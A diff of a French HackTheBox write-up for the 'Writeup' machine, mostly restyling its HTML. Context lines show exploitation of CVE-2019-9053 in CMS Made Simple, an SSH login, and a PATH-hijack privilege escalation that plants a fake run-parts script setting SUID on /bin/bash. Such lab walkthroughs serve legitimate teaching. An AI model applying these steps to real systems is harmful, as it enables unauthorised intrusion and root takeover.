@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Writeup - HackTheBox WriteUp"
-date: 2024-01-25
+date: 2024-09-14
 categories: [CTF, HackTheBox, WriteUp]
 tags: [WebApp, CMSMadeSimple, CVE-2019-9053, SQLInjection, PrivEsc, PathHijacking, ProcessMonitoring, Linux]
 difficulty: Easy
@@ -12,8 +12,8 @@ permalink: /fr/blog/2024/01/25/writeup-htb-writeup/
 excerpt: "Machine Linux hébergeant un CMS Made Simple vulnérable. Exploitation SQLi CVE-2019-9053 pour obtenir des credentials, puis escalade de privilèges via PATH hijacking."
 ---
 
-<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-8 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
-    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
+<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
+    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
         <div class="flex-1">
             <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                 <i class="fas fa-cube mr-3"></i>Writeup
@@ -31,37 +31,50 @@ excerpt: "Machine Linux hébergeant un CMS Made Simple vulnérable. Exploitation
             </span>
         </div>
     </div>
-    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
-        <div class="flex items-center gap-2">
-            <i class="fas fa-calendar text-green-500"></i>
+
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
+        <div class="flex items-center gap-3">
+            <div class="text-green-500 text-xl">
+                <i class="fas fa-calendar"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">25/01/2024</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2024-09-14</div>
             </div>
         </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-network-wired text-blue-500"></i>
+
+        <div class="flex items-center gap-3">
+            <div class="text-blue-500 text-xl">
+                <i class="fas fa-network-wired"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">IP Target</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">10.10.10.138</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.10.10.138</div>
             </div>
         </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-shield-alt text-purple-500"></i>
+
+        <div class="flex items-center gap-3">
+            <div class="text-purple-500 text-xl">
+                <i class="fas fa-shield-alt"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">Debian</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Debian</div>
             </div>
         </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-star text-amber-500"></i>
+
+        <div class="flex items-center gap-3">
+            <div class="text-amber-500 text-xl">
+                <i class="fas fa-star"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">20</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">20</div>
             </div>
         </div>
     </div>
 </div>
+
 
 ## 🎯 Synopsis
 
@@ -69,7 +82,7 @@ excerpt: "Machine Linux hébergeant un CMS Made Simple vulnérable. Exploitation
 
 L'exploitation de cette vulnérabilité permet de récupérer des <span class="text-highlight-blue">**identifiants utilisateur**</span> incluant un hash salé. Après cracking, l'accès SSH est obtenu avec l'utilisateur `jkr`. L'énumération locale révèle que cet utilisateur appartient au groupe <span class="text-highlight-purple">**staff**</span>, disposant de droits d'écriture dans `/usr/local/bin`, un répertoire inclus dans le <span class="text-highlight-red">**PATH système**</span>. Cette configuration est exploitée via un <span class="text-highlight-orange">**PATH hijacking**</span> pour obtenir un <span class="text-highlight-green">**shell root**</span>.
 
-<div class="grid md:grid-cols-2 gap-6 my-10">
+<div class="grid md:grid-cols-2 gap-6 my-4">
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
         <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
             <i class="fas fa-brain mr-2"></i>Compétences requises
@@ -114,7 +127,7 @@ ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.138 | grep '^[0-9]' | cut -d'/
 nmap -p$ports -sC -sV 10.10.10.138
 ```
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
+<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
     <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
         <i class="fas fa-search mr-2"></i>Résultats du scan
     </h4>
@@ -191,8 +204,8 @@ L'analyse du code source HTML révèle :
 <meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019" />
 ```
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
-    <div class="flex items-center gap-4 mb-4">
+<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-blue-500">
+    <div class="flex items-start gap-4 mb-4">
         <div class="text-4xl text-blue-500">
             <i class="fas fa-newspaper"></i>
         </div>
@@ -244,7 +257,7 @@ cd CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
 python cve.py -u http://10.10.10.138/writeup/ --crack -w best110.txt
 ```
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
+<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
     <h4 class="text-xl font-bold mb-4 text-green-600 dark:text-green-400 flex items-center">
         <i class="fas fa-key mr-2"></i>Informations extraites
     </h4>
@@ -300,7 +313,7 @@ ssh jkr@10.10.10.138
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-check-circle mr-2 text-green-500"></i>
-        Connexion SSH réussie\!
+        Connexion SSH réussie!
     </p>
 </div>
 
@@ -332,7 +345,7 @@ cat ~/user.txt
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200">
         <i class="fas fa-flag mr-2 text-green-500"></i>
-        <strong>User flag obtenu \!</strong> Première étape complétée.
+        <strong>USER FLAG OBTENU !</strong> Première étape complétée.
     </p>
 </div>
 
@@ -398,7 +411,7 @@ chmod +x /tmp/pspy32
 
 ### Analyse des résultats
 
-<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-purple-500">
+<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4 border-l-4 border-purple-500">
     <h4 class="text-xl font-bold mb-4 text-purple-600 dark:text-purple-400 flex items-center">
         <i class="fas fa-eye mr-2"></i>Observation critique
     </h4>
@@ -434,7 +447,7 @@ Nous allons :
 Création du binaire piégé :
 
 ```bash
-echo -e '#\!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
+echo -e '#!/bin/bash\nchmod u+s /bin/bash' > /usr/local/bin/run-parts
 chmod +x /usr/local/bin/run-parts
 ```
 
@@ -460,7 +473,7 @@ ls -l /bin/bash
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-check-circle mr-2 text-green-500"></i>
-        Le bit SUID est maintenant défini sur /bin/bash \!
+        Le bit SUID est maintenant défini sur /bin/bash !
     </p>
 </div>
 
@@ -482,9 +495,9 @@ id
 </div>
 
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
-    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
+    <p class="text-green-800 dark:text-green-200">
         <i class="fas fa-crown mr-2 text-amber-500"></i>
-        ROOT SHELL OBTENU \! euid=0(root) atteint.
+        <strong>ROOT SHELL OBTENU !</strong> euid=0(root) atteint.
     </p>
 </div>
 
@@ -500,7 +513,7 @@ cat /root/root.txt
             <i class="fas fa-trophy"></i>
         </div>
         <div class="flex-1">
-            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
+            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
             <p class="text-gray-700 dark:text-gray-300">
                 <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> /home/jkr/user.txt<br>
                 <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> /root/root.txt
@@ -511,7 +524,7 @@ cat /root/root.txt
 
 ## 📋 Phase 9 — Recommandations et remédiations
 
-<div class="grid md:grid-cols-2 gap-6 my-8">
+<div class="grid md:grid-cols-2 gap-6 my-4">
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
         <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
             <i class="fas fa-globe mr-2"></i>Application
@@ -624,34 +637,34 @@ cat /root/root.txt
 
 ## 🔗 Chaîne d'attaque résumée
 
-<div class="bg-white dark:bg-dark-navbar p-8 rounded-xl shadow-lg my-8">
-    <h3 class="text-2xl font-bold text-portfolio-violet mb-6 flex items-center">
+<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
+    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
         <i class="fas fa-project-diagram mr-3"></i>Parcours d'attaque complet
     </h3>
     <div class="space-y-4">
-        <div class="flex items-center gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
-            <div class="text-3xl font-bold text-blue-500">1</div>
+        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
+            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
             <div class="flex-1">
                 <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et énumération</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → robots.txt → /writeup/ → CMS Made Simple</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
-            <div class="text-3xl font-bold text-green-500">2</div>
+        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
+            <div class="text-3xl font-bold text-green-500 mt-1">2</div>
             <div class="flex-1">
                 <div class="font-bold text-green-600 dark:text-green-400">Exploitation et accès initial</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2019-9053 SQLi → Hash cracking → SSH jkr</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
-            <div class="text-3xl font-bold text-purple-500">3</div>
+        <div class="flex items-start gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
+            <div class="text-3xl font-bold text-purple-500 mt-1">3</div>
             <div class="flex-1">
                 <div class="font-bold text-purple-600 dark:text-purple-400">Énumération locale</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">Groupe staff → /usr/local/bin writable → pspy monitoring</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
-            <div class="text-3xl font-bold text-red-500">4</div>
+        <div class="flex items-start gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
+            <div class="text-3xl font-bold text-red-500 mt-1">4</div>
             <div class="flex-1">
                 <div class="font-bold text-red-600 dark:text-red-400">Escalade de privilèges</div>
                 <div class="text-sm text-gray-600 dark:text-gray-400">PATH hijacking → Fake run-parts → SUID bash → Root</div>
